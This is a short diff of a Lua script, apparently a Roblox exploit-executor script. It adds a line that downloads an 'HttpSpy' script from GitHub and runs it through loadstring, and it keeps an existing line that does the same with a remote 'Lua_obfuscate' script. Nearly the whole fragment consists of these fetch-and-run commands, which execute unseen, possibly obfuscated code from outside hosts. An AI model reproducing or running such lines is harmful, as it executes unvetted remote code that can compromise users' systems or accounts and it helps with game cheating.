@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotDSF/HttpSpy/main/init.lua"))();
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LocalWendy/Help_Script/main/Lua_obfuscate.Lua"))()
 
 local CoreGui = game:GetService("StarterGui")
